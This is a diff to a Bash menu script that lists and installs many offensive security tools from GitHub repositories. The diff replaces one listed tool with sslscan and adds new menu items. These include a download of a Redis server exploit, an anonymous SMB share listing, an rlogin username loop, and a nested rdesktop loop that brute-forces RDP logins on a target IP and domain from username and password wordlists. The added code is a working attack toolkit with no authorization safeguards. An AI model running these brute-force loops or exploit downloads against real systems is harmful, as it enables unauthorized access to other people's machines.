@@ -375,7 +375,7 @@ while true; do
 	echo -ne " 255. unkn0wnh4ckr/hackers-tool-kit\t\t256. santatic/web2attack\t\t\t\t257. andyvaikunth/roxysploit\n"
 	echo -ne " 258. x3omdax/PenBox\t\t\t\t259. dhondta/dronesploit\t\t\t\t282. m4n3dw0lf/pythem\n"
 	echo -ne " 284. brutemap-dev/brutemap\t\t\t288. dark-lbp/isf\t\t\t\t\t289. onccgroup/redsnarf\n"
-	echo -ne " 296. Z4nzu/hackingtool\t\t\t\t298. lanjelot/patator\t\t\t\t\t304. GitHackTools/BruteDum/brutedum\n"
+	echo -ne " 296. Z4nzu/hackingtool\t\t\t\t304. GitHackTools/BruteDum/brutedum\n"
 	echo -ne " 310. future-architect/vuls\t\t\t311. ethicalhackerproject/TaiPan\t\t\t319. marcrowProject/Bramble\n"
 	echo -ne " 320. stevemcilwain/quiver\t\t\t322. abdulr7mann/hackerEnv\t\t\t\t359. lgandx/Responder\n"
 	echo -ne " 392. zerosum0x0/koadic\t\t\t\t403. Screetsec/TheFatRat\t\t\t\t404. OWASP/Amass\n"
@@ -455,6 +455,9 @@ while true; do
 	echo -ne " 390. lanmaster53/recon-ng\t\t\t391. methos2016/recon-ng\t\t\t\t501. LukaSikic/subzy\n"
 	echo -ne " 556. LordNeoStark/tugarecon\t\t\t594. r3vn/badKarma\t\t\t\t\t599. utkusen/urlhunter\n"
 	echo -ne " 601. UnaPibaGeek/ctfr\t\t\t\t607. thewhiteh4t/seeker\t\t\t\t\t732. gotr00t0day/spyhunt\n"
+	echo "$SEP"
+	echo "REDIS"
+	echo -ne " 759. Avinash-acid/Redis-Server-Exploit\n"
 	echo "$SEP"
 	echo "REVERSING"
 	echo -ne " 361. yeggor/UEFI_RETool\t\t\t737. gotr00t0day/b1n4ryR3v3rs3\n"
@@ -538,6 +541,7 @@ while true; do
 	echo "$SEP"
 	echo "SSL"
 	echo -ne " 190. moxie0/sslstrip\t\t\t\t194. indutny/heartbleed\t\t\t\t\t195. roflcer/heartbleed-vuln/attack\n"
+	echo -ne " 298. rbsec/sslscan\n"
 	echo "$SEP"
 	echo "STEGANALYSIS"
 	echo -ne " 270. Va5c0/Steghide-Brute-Force-Tool/steg_brute\t\t\t\t\t\t\t271. daniellerch/aletheia\n"
@@ -591,6 +595,7 @@ while true; do
 	echo -ne " 747. get netbios infos with nmblookup\t749. download all files from IP in ftp with anonymous creds\n"
 	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\t\t751. RCE with finger\n"
 	echo -ne " 754. get RPC info\t\t\t\t755. get RPC connect\n"
+	echo -ne " 756. smb connection\t757. rlogin dictionary attack\t758. rdesktop dictionary attack\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -1992,7 +1997,7 @@ while true; do
 		fi
 	;;
 	"298")
-		Clona "lanjelot/patator"
+		Clona "rbsec/sslscan"
 	;;
 	"299")
 		Clona "brandonskerritt/RustScan"
@@ -4000,6 +4005,47 @@ while true; do
 		then
 			rpcclient -U "" "$IP"
 		fi
+	;;
+	"756")
+		smbclient -L //$IP -N
+	;;
+	"757")
+		for USR in $(cat "$UWRD");
+		do
+			rlogin -l "$USR" $IP
+		done
+	;;
+	"758")
+		echo "Digit a target IP"
+		read -p "(example, 10.11.12.13): " IP
+		if [[ "$IP" != "" ]];
+		then
+			echo "Digit a domain"
+			read -p "(example, MY-PC): " DMN
+			if [[ "$DMN" != "" ]];
+			then
+				echo "Digit USERNAME wordlist full path"
+				read -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
+				if [[ -f "$UWRD" ]];
+				then
+					echo "Digit PASSWORD wordlist full path"
+					read -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
+					if [[ -f "$PWRD" ]];
+					then
+						for PSS in $(cat "$PWRD");
+						do
+							for USR in $(cat "$UWRD");
+							do
+								rdesktop -d "$DMN" -u "$USR" -p "$PSS" "$IP"
+							done
+						done
+					fi
+				fi
+			fi
+		fi
+	;;
+	"759")
+		Scarica "$ENTRAW""Avinash-acid/Redis-Server-Exploit/master/redis.py"
 	;;
 	*)
 		echo "error, invalid choice"
